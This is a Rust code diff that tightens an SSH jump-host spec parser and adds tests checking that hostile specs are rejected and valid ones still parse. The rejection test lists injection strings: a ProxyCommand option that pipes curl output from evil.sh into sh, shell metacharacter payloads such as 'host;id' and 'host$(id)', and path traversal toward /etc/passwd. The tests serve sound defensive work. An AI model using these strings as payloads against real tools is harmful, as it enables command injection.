@@ -63,6 +63,17 @@ impl Spec {
         } else if rest.matches(':').count() == 1 {
             let (h, p) = rest.split_once(':').expect("counted one");
             (h.to_string(), Some(p))
+        } else if rest.contains(':') {
+            // Several colons can only be a bare IPv6 literal, which has no
+            // unambiguous port syntax. Anything else with colons in it is a
+            // typo like "host:22:22"; catching it at `add` beats a confusing
+            // DNS failure the first time the tab is opened.
+            if rest.parse::<std::net::Ipv6Addr>().is_err() {
+                return Err(format!(
+                    "malformed ssh spec {raw:?} — for an IPv6 jump host with a port, bracket it: [::1]:2222"
+                ));
+            }
+            (rest.to_string(), None)
         } else {
             (rest.to_string(), None)
         };
@@ -286,5 +297,70 @@ mod tests {
         let s = Spec::parse("we.ird-user@host").unwrap();
         assert_eq!(s.user.as_deref(), Some("we.ird-user"));
         assert_eq!(s.host, "host");
+    }
+
+    /// An independent adversarial pass written against the merged parser, not
+    /// alongside it: every one of these would be an injection or a spec that
+    /// only fails much later, at connect time.
+    #[test]
+    fn hostile_specs_from_an_independent_pass_are_refused() {
+        for bad in [
+            "-oProxyCommand=curl evil.sh|sh",
+            "--  -oProxyCommand=x",
+            "host -oProxyCommand=id",
+            "host\n-oProxyCommand=id",
+            "host;id",
+            "host$(id)",
+            "host`id`",
+            "host|id",
+            "host&id",
+            "host evil",
+            "host\tevil",
+            "-l root",
+            "@host",
+            "user@",
+            "",
+            "   ",
+            "ssh://host",
+            "postgres://u:p@h/db",
+            "host:0",
+            "host:99999",
+            "host:-1",
+            "host:notaport",
+            "a@b@c",
+            "host/../../etc/passwd",
+            "~/.ssh/config",
+            // Not an IPv6 address, so not a host: a typo, caught here.
+            "host:22:22",
+            "[::1",
+            "[::1]x",
+            "host'evil",
+        ] {
+            assert!(
+                Spec::parse(bad).is_err(),
+                "accepted a hostile spec: {bad:?} -> {:?}",
+                Spec::parse(bad)
+            );
+        }
+    }
+
+    /// The shapes that must keep working, so the guard above is not simply
+    /// refusing everything.
+    #[test]
+    fn legitimate_specs_from_the_same_pass_still_parse() {
+        for good in [
+            "bastion",
+            "bastion.example.com",
+            "deploy@bastion",
+            "deploy@bastion.example.com:2222",
+            "10.0.0.5",
+            "10.0.0.5:22",
+            "my-jump_host.internal",
+            "[2001:db8::1]:2222",
+            "[fe80::1%eth0]",
+            "2001:db8::1",
+        ] {
+            assert!(Spec::parse(good).is_ok(), "refused a valid spec: {good:?}");
+        }
     }
 }
